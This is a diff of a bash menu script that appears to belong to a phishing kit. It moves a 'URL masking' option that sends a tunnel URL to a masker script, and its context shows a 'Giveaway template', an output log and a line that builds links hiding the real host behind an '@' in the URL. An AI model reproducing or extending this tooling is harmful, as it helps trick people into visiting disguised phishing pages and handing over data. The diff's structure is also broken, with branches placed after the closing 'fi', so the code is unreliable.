@@ -146,23 +146,6 @@ if [[ $option == "4" ]]; then
     exec ./techyfatcat.sh
 fi
 
-elif [[ $option == "5" ]]; then
-    clear
-    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "  ${C}URL MASKING MODULE${NC}"
-    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    # Use the current tunnel URL if it exists, else ask
-    if [ -z "$FINAL_URL" ]; then
-        read -p "  Enter Original URL: " FINAL_URL
-    fi
-    
-    # Call the python script
-    python3 modules/masker.py "$FINAL_URL"
-    
-    read -p "  Press Enter to return to main menu..."
-    exec ./techyfatcat.sh
-fi
     # The magic: creating the masked link
     # Format: https://mask-domain-keywords@short-url
     masked_url="https://$mask_dom-$keywords@${short_url#https://}"
@@ -216,6 +199,24 @@ elif [[ $option == "3" ]]; then
     LOG_FILE="$ROOT_DIR/logs/output.txt"
     echo -e "\n${Y}[*] Loading Giveaway template...${NC}"
 
+    elif [[ $option == "5" ]]; then
+    clear
+    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${C}URL MASKING MODULE${NC}"
+    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Use the current tunnel URL if it exists, else ask
+    if [ -z "$FINAL_URL" ]; then
+        read -p "  Enter Original URL: " FINAL_URL
+    fi
+    
+    # Call the python script
+    python3 modules/masker.py "$FINAL_URL"
+    
+    read -p "  Press Enter to return to main menu..."
+    exec ./techyfatcat.sh
+
+
 else
 
 echo -e "${R}[!] Invalid option${NC}"
@@ -223,6 +224,8 @@ echo -e "${R}[!] Invalid option${NC}"
 exit 1
 
 fi
+
+
 
 ############################################
 # CLEAN OLD PROCESSES
